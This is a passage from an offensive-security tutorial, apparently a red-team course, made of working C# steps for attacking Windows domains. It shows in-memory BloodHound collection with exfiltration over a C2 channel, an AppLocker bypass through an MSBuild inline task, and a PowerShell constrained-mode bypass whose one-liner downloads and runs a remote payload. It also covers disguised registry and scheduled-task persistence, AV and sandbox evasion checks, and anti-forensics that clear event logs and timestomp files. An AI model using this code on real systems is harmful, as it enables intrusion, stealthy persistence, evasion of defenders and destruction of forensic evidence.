// Targets: SMB (445), WMI (135), WinRM (5985), RDP (restricted admin mode)
```

### Step 68 — BloodHound Data Collection from C#
Collecting Active Directory relationship data programmatically for attack path analysis.
```csharp
// SharpHound is the official C# BloodHound collector.
// Understanding its internals lets you build custom collectors or integrate
// collection into your implant without dropping SharpHound.exe to disk.

// Core collection methods (configurable via CollectionMethod enum):
// Default        → Sessions, Trusts, ACLs, ObjectProps, Containers
// All            → everything including LocalAdmin, RDP, DCOM, PSRemote
// DCOnly         → fast — only DC-sourced data (no lateral enumeration)
// ComputerOnly   → sessions and local group memberships from all hosts

// Key LDAP queries SharpHound performs (reusable from Step 61):
//   All users with AdminCount=1    → "(&(objectClass=user)(adminCount=1))"
//   All GPOs                       → "(objectClass=groupPolicyContainer)"
//   All OUs                        → "(objectClass=organizationalUnit)"
//   Computers not marked disabled  → "(&(objectClass=computer)(!userAccountControl:1.2.840.113556.1.4.803:=2))"

// In-memory collection pattern (avoid writing JSON to disk):
// 1. Assembly.Load(sharpHoundBytes) from Step 42
// 2. Invoke SharpHound.Program.Main with args
// 3. Intercept FileStream output or redirect to MemoryStream
// 4. Exfiltrate ZIP bytes over C2 channel

// The resulting ZIP → import directly into BloodHound for path analysis
```

---

## ⚪ Stage 13 — AppLocker & CLM Bypass Techniques
> Bypassing application whitelisting and PowerShell Constrained Language Mode.

### Step 69 — AppLocker Enumeration from C#
Reading AppLocker policy from the registry to understand what execution paths are blocked.
```csharp
// AppLocker policies are stored in:
// HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2\

// Rule categories: Exe, Dll, Script, Msi, Appx
// Each has: Allow / Deny rules with conditions (Publisher, Path, Hash)

using Microsoft.Win32;

RegistryKey srpKey = Registry.LocalMachine.OpenSubKey(
    @"SOFTWARE\Policies\Microsoft\Windows\SrpV2");

if (srpKey == null)
{
    Console.WriteLine("[*] No AppLocker policy found — enforcement disabled");
}
else
{
    foreach (string ruleType in srpKey.GetSubKeyNames())
    {
        Console.WriteLine($"[AppLocker] Rule type: {ruleType}");
        RegistryKey ruleKey = srpKey.OpenSubKey(ruleType);
        // EnforcementMode: 0 = Audit, 1 = Enforced
        object mode = ruleKey.GetValue("EnforcementMode");
        Console.WriteLine($"  EnforcementMode: {mode}");
    }
}
```

### Step 70 — MSBuild Inline Task Execution
Abusing `MSBuild.exe` — a Microsoft-signed binary — to compile and execute C# inline tasks, bypassing AppLocker exe/script rules.
```xml
<!-- evil.csproj — executed with: MSBuild.exe evil.csproj -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Execute">
    <ClassTask />
  </Target>
  <UsingTask TaskName="ClassTask" TaskFactory="CodeTaskFactory"
             AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
          using Microsoft.Build.Framework;
          using System.Diagnostics;
          public class ClassTask : ITask {
              public IBuildEngine BuildEngine { get; set; }
              public ITaskHost HostObject { get; set; }
              public bool Execute() {
                  Process.Start("cmd.exe", "/c whoami > C:\\Temp\\out.txt");
                  return true;
              }
          }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

```csharp
// Trigger from C# implant:
Process.Start("MSBuild.exe", @"C:\Temp\evil.csproj");

// Why it bypasses AppLocker:
// MSBuild.exe is in C:\Windows\Microsoft.NET\ — typically whitelisted by path
// The .csproj is treated as data, not a script — Script rules don't apply
// Code compiles and executes entirely in the MSBuild process memory
```

### Step 71 — Constrained Language Mode Detection & Bypass
Detecting PowerShell CLM and escaping it using a custom runspace or downgrade attack.
```csharp
// Detect CLM from within PowerShell (for recon):
// $ExecutionContext.SessionState.LanguageMode
// → ConstrainedLanguage or FullLanguage

// From C# — check if CLM is enforced via __PSLockdownPolicy env var:
string clmPolicy = Environment.GetEnvironmentVariable("__PSLockdownPolicy");
if (clmPolicy == "4")
    Console.WriteLine("[!] PowerShell CLM enforced");

// Bypass 1 — Custom Runspace (Step 44):
// Runspaces created from C# inherit NO language mode restrictions
// unless the host explicitly sets InitialSessionState.LanguageMode

InitialSessionState iss = InitialSessionState.CreateDefault();
iss.LanguageMode = PSLanguageMode.FullLanguage;  // force FullLanguage
Runspace rs = RunspaceFactory.CreateRunspace(iss);
rs.Open();

// Bypass 2 — PowerShell version downgrade:
// powershell -Version 2 -Command "..."
// PSv2 has no CLM support — LanguageMode does not exist
// Requires .NET 2.0 / PSv2 to be installed on target
Process.Start("powershell", "-Version 2 -Command \"IEX (New-Object Net.WebClient).DownloadString('http://c2/payload.ps1')\"");
```

---

## 🟢 Stage 14 — Advanced Post-Exploitation
> Persistence, situational awareness, and cleanup — operational tradecraft.

### Step 72 — Registry Persistence
Writing run keys and scheduled task triggers for persistent implant execution.
```csharp
using Microsoft.Win32;

// HKCU Run key — persists as current user, no admin required
RegistryKey runKey = Registry.CurrentUser.OpenSubKey(
    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", writable: true);

runKey.SetValue("WindowsUpdate", @"C:\Users\Public\implant.exe");

// HKLM Run key — persists system-wide, requires admin
RegistryKey sysKey = Registry.LocalMachine.OpenSubKey(
    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", writable: true);
sysKey.SetValue("WinDefend", @"C:\Windows\Temp\svc.exe");

// Stealth: use existing key names to blend in
// Common benign names: OneDrive, SecurityHealth, Teams

// WMI subscription persistence (fileless, survives reboots):
// EventFilter + EventConsumer + FilterToConsumerBinding
// Requires System.Management — similar to Step 65 WMI usage
```

### Step 73 — Scheduled Task Creation
Programmatically creating scheduled tasks via the Task Scheduler COM interface.
```csharp
using TaskScheduler;  // COM reference: taskschd.dll

// Connect to Task Scheduler
ITaskService ts = new TaskScheduler.TaskScheduler();
ts.Connect();

ITaskDefinition td = ts.NewTask(0);
td.RegistrationInfo.Description = "Windows Update Helper";
td.Principal.RunLevel = _TASK_RUNLEVEL.TASK_RUNLEVEL_HIGHEST;

// Trigger: at system startup
IBootTrigger trigger = (IBootTrigger)td.Triggers.Create(_TASK_TRIGGER_TYPE2.TASK_TRIGGER_BOOT);
trigger.Delay = "PT30S";  // 30 second delay after boot

// Action: run implant
IExecAction action = (IExecAction)td.Actions.Create(_TASK_ACTION_TYPE.TASK_ACTION_EXEC);
action.Path = @"C:\Windows\Temp\svc.exe";
action.Arguments = "";

// Register under a legitimate-looking name
ITaskFolder rootFolder = ts.GetFolder("\\");
rootFolder.RegisterTaskDefinition(
    "MicrosoftEdgeUpdateCore",
    td,
    (int)_TASK_CREATION.TASK_CREATE_OR_UPDATE,
    null, null,
    _TASK_LOGON_TYPE.TASK_LOGON_INTERACTIVE_TOKEN,
    "");

Console.WriteLine("[+] Scheduled task created");
```

### Step 74 — Situational Awareness
Automated environment profiling — AV detection, domain status, privilege level, sandbox evasion.
```csharp
using System.Diagnostics;
using System.Management;
using Microsoft.Win32;

static class SituationalAwareness
{
    // Check if running as SYSTEM
    public static bool IsSystem() =>
        System.Security.Principal.WindowsIdentity.GetCurrent().IsSystem;

    // Check domain membership
    public static string GetDomain() =>
        System.Net.NetworkInformation.IPGlobalProperties
            .GetIPGlobalProperties().DomainName;

    // Detect common AV/EDR processes
    public static List<string> DetectAV()
    {
        string[] avProcesses = {
            "MsMpEng", "SentinelAgent", "CylanceSvc", "cb",
            "csfalconservice", "bdagent", "kavfsgt", "ekrn"
        };
        return Process.GetProcesses()
            .Where(p => avProcesses.Contains(p.ProcessName, StringComparer.OrdinalIgnoreCase))
            .Select(p => p.ProcessName)
            .ToList();
    }

    // Detect sandbox / analysis environment
    public static bool IsSandbox()
    {
        // Low RAM = sandbox indicator
        var query = new ManagementObjectSearcher("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem");
        ulong ram = (ulong)query.Get().Cast<ManagementObject>().First()["TotalPhysicalMemory"];
        if (ram < 2_000_000_000UL) return true;

        // Fewer than 2 CPU cores
        if (Environment.ProcessorCount < 2) return true;

        // Common sandbox usernames
        string user = Environment.UserName.ToLower();
        if (user == "sandbox" || user == "maltest" || user == "virus") return true;

        return false;
    }

    // Check SeDebugPrivilege
    public static bool HasSeDebug()
    {
        try
        {
            Process.GetProcessById(4); // System process — requires SeDebugPrivilege
            return true;
        }
        catch { return false; }
    }
}
```

### Step 75 — Anti-Forensics & Cleanup
Removing artefacts after operation — log clearing, file wiping, timestomping.
```csharp
using System.Diagnostics;
using System.Runtime.InteropServices;

static class Cleanup
{
    // Clear Windows Security and System event logs
    public static void ClearEventLogs()
    {
        string[] logs = { "Security", "System", "Application",
                          "Microsoft-Windows-PowerShell/Operational" };
        foreach (string log in logs)
        {
            try { new EventLog(log).Clear(); }
            catch { /* insufficient privileges */ }
        }
    }

    // Overwrite file contents before deletion (basic wipe)
    public static void SecureDelete(string path)
    {
        if (!File.Exists(path)) return;
        long size = new FileInfo(path).Length;
        using (FileStream fs = new FileStream(path, FileMode.Open, FileAccess.Write))
        {
            byte[] zeros = new byte[size];
            fs.Write(zeros, 0, zeros.Length);
        }
        File.Delete(path);
    }

    // Timestomp — overwrite file timestamps to blend with system files
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool SetFileTime(IntPtr hFile,
        ref long lpCreationTime, ref long lpLastAccessTime, ref long lpLastWriteTime);

    public static void Timestomp(string path, DateTime fakeTime)
    {
        File.SetCreationTime(path, fakeTime);
        File.SetLastWriteTime(path, fakeTime);
        File.SetLastAccessTime(path, fakeTime);
    }
}
```

---
